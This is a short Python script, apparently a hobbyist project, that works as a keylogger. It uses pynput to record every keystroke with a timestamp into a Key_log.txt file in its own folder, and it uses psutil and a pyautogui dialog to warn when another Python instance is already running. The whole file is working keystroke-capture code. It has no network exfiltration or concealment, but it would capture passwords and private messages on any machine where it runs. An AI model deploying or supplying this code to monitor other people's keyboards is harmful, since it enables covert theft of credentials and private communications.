from pynput.keyboard import Listener
import logging
import os
import pyautogui as pt
import psutil


def is_python_running():
    current_process_pid = psutil.Process().pid

    python_running = 0

    for process in psutil.process_iter(['pid', 'name']):
        pid = process.info['pid']
        if pid == current_process_pid:
            continue
        if process.info['name'] == 'pythonw.exe' or process.info['name'] == 'python.exe':
            python_running = python_running + 1
    if python_running > 1:
        return True
    return False


if is_python_running():
    pyconfirm = pt.confirm("An instance of Python is already running. Please make sure that it isn't an instance of "
                           "the keylogger"
                           "before starting, as it will become buggy. Do you want to start the keylogger?")
    if pyconfirm == 'OK':
        pass
    else:
        exit()


log_dir = os.path.dirname(os.path.abspath(__file__))

logging.basicConfig(filename=os.path.join(log_dir, 'Key_log.txt'),
                    format='%(asctime)s %(message)s',
                    datefmt='%m-%d-%Y %H:%M:%S',
                    level=logging.DEBUG, )


def on_press(key):
    logging.info(key)


if psutil.Process().name() == 'python.exe':
    print('Close The terminal to stop keylogging.')
else:
    pass

with Listener(on_press=on_press) as listener:
    listener.join()
